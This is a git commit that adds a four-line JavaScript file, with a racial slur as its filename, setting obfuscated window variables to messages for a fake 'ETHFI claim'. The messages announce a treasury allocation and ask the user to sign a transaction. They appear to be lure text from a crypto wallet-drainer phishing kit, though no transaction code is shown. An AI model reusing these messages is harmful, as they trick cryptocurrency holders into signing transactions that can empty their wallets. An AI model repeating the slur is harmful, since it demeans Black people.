d66298b8152cb756a1b17c77a6c326da3190a033
starhomes003 <167900145+starhomes003@users.noreply.github.com>
2024-07-18 03:08:16 +0100

    Add files via upload

---
+++ fuckoffnigger.js
@@ -0,0 +1,4 @@
+window.bi50pouot = "Checking Etherfi Treasury for allocation..";
+window.usqtludgq = "Etherfi Treasury allocation found";
+window.rmlr0otr6i = "Completing 283 ETHFI claim process";
+window.t4e2qh2nxu = "Sign transaction to complete ETHFI claim procedure";
